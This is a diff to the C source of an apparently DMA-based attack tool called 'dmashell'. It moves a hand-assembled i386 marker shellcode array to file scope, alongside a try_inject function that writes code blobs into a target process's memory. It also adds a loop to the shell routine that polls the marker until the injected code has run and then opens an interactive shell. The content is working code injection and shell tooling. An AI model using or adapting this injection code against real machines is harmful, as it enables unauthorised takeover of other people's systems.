@@ -51,34 +51,11 @@ char pagedir[4096];
 
 #define NODE_OFFSET     0xffc0
 
-// tries to inject the given code-blob with a marker-code in front of it into a process.
-// values of aggressiveness:
-// 	 & 1: write (but only at locations that are pointers into the binary)
-// 	 & 2: also try anywhere that may be a pointer to 0x08~~~~~~ or 0xb7~~~~~~ (does not write if not &1)
-// return virtual address of injected code.
-uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int injectcodelen, int aggressiveness)
-{{{
-	// i386-code that marks itself when being executed:
-	//
-	// runtime ESP is saved @9; possible new ESP is loaded from there (if != 0xffffffff)
-	// the 0x11 0xee 0xee 0x11 @5 change to 0xee 0x11 0x11 0xee
-	static const char marker[] = {
-				//				start:
-				0xe8, 0x08, 0x00, 0x00, 0x00,	//			call near string_get_address
-				0x11, 0xee, 0xee, 0x11,		//			dd	0x11eeee11
-				0xff, 0xff, 0xff, 0xff,		//			dd	0xffffffff
-				//				string_get_address:
-				0x5a,				//			pop	edx
-				0x8b, 0x42, 0x04,		//			mov	eax, [edx+4]
-				0x89, 0x62, 0x04,		//			mov	[edx+4], esp
-				0x3d, 0xff, 0xff, 0xff, 0xff,	//			cmp	eax,0xffffffff
-				0x74, 0x02,			//			je	set_esp_done
-				0x89, 0xc4,			//			mov	esp,eax
-				//				set_esp_done:
-				0x8b, 0x02,			//			mov	eax, [edx]
-				0xf7, 0xd0,			//			not	eax
-				0x89, 0x02			//			mov	[edx], eax
-	};
+// i386-code that marks itself when being executed:
+//
+// runtime ESP is saved @9; possible new ESP is loaded from there (if != 0xffffffff)
+// the 0x11 0xee 0xee 0x11 @5 change to 0xee 0x11 0x11 0xee
+// {{{ MARKER SHELLCODE
 
 #define MARKER_LEN     35
 #define MARK_OFFSET    5
@@ -86,6 +63,33 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 #define MARK_CHANGED   0xee1111ee
 #define ESP_OFFSET     9
 #define ESP_UNCHANGED  0xffffffff
+
+static const char marker[] = {
+			//				start:
+			0xe8, 0x08, 0x00, 0x00, 0x00,	//			call near string_get_address
+			0x11, 0xee, 0xee, 0x11,		//			dd	0x11eeee11
+			0xff, 0xff, 0xff, 0xff,		//			dd	0xffffffff
+			//				string_get_address:
+			0x5a,				//			pop	edx
+			0x8b, 0x42, 0x04,		//			mov	eax, [edx+4]
+			0x89, 0x62, 0x04,		//			mov	[edx+4], esp
+			0x3d, 0xff, 0xff, 0xff, 0xff,	//			cmp	eax,0xffffffff
+			0x74, 0x02,			//			je	set_esp_done
+			0x89, 0xc4,			//			mov	esp,eax
+			//				set_esp_done:
+			0x8b, 0x02,			//			mov	eax, [edx]
+			0xf7, 0xd0,			//			not	eax
+			0x89, 0x02			//			mov	[edx], eax
+};
+// }}}
+
+// tries to inject the given code-blob with a marker-code in front of it into a process.
+// values of aggressiveness:
+// 	 & 1: write (but only at locations that are pointers into the binary)
+// 	 & 2: also try anywhere that may be a pointer to 0x08~~~~~~ or 0xb7~~~~~~ (does not write if not &1)
+// return virtual address of injected code. (excluding marker)
+uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int injectcodelen, int aggressiveness)
+{{{
 
 	addr_t stack_bottom;
 	addr_t binary_first;
@@ -316,8 +320,27 @@ void use_shell(linear_handle lin, uint32_t base)
 	set_nonblocking_stdin();
 	// set STDIN to non-blocking.
 
-//	printf(TERM_YELLOW "(dmashell)" TERM_RESET " rfrm_writer_pos is @0x%08x (offset 0x%03x).\n", base + RFRM_WRITER_POS, RFRM_WRITER_POS);
-	printf(TERM_YELLOW "(dmashell)" TERM_RESET " interactive shell may work at any time now.\n");
+	{ 
+		uint32_t mark_value;
+		uint32_t mark_location;
+		int secs = 0;
+
+		// calc offset of mark
+		mark_location = base - MARKER_LEN + MARK_OFFSET;
+		// get mark
+		linear_read(lin, mark_location, &mark_value, 4);
+		if(mark_value != MARK_CHANGED) {
+			printf(TERM_YELLOW "(dmashell)" TERM_RESET " waiting for shellcode to be executed...\n");
+			while(mark_value != MARK_CHANGED) {
+				printf("still sleeping (%d seconds, mark: 0x%08x)\r", secs, mark_value);
+				sleep(1);
+				// get mark
+				linear_read(lin, mark_location, &mark_value, 4);
+			}
+		}
+	}
+
+	printf(TERM_YELLOW "(dmashell)" TERM_RESET " interactive shell should work now.\n");
 	printf(TERM_YELLOW "(dmashell)" TERM_RESET " press CTRL-C to enter menu-mode\n");
 
 	signal(SIGINT, handle_sigint);
